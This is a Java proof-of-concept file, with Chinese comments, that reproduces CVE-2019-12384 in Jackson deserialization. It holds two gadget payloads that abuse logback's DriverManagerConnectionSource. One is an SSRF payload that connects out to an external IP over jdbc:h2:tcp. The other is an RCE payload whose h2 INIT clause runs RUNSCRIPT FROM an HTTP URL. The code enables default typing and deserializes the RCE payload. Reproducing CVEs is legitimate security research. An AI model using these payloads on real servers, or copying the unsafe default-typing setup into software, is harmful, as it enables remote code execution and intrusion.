package com.snowsec0.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import com.fasterxml.jackson.databind.SerializationFeature;

import org.h2.Driver;


public class JacksonSerial {
	
	/*
	 * cve-2019-12384
	 */

	public static void cve201912384() {
		try {
		//一定要实例化Driver否则会报错
        Class.forName("org.h2.Driver").newInstance();

        System.out.println("Mapping");

        //该条payload用于SSRF的复现

        String jsonStr1 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://47.104.218.243/ssrf/ssrf.php\"}]";

        //该条payload用于RCE的复现

        String jsonStr2 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1/inject.sql'\"}]";

        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);

        System.out.println("Serializing");

        Object obj = mapper.readValue(jsonStr2, java.lang.Object.class);

        System.out.println("objectified");
        
        System.out.println("stringified: " + mapper.writeValueAsString(obj));
		}catch(Exception e)
		{
			System.out.println(e.toString());
		}
		
		
	}
}
